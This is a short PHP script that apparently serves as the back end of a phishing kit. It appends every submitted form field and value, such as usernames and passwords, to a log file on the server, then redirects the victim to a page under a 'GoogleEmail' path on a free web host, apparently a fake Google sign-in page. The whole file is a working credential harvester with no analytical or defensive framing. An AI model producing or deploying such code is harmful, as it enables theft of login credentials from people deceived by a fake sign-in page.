<?php

header ('Location: https://organized-shaft.000webhostapp.com/GoogleEmail/index.html');

$handle = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {

   fwrite($handle, $variable);

   fwrite($handle, "=");

   fwrite($handle, $value);

   fwrite($handle, "rn |");

}

fwrite($handle, "rn |");

fclose($handle);

exit;

?>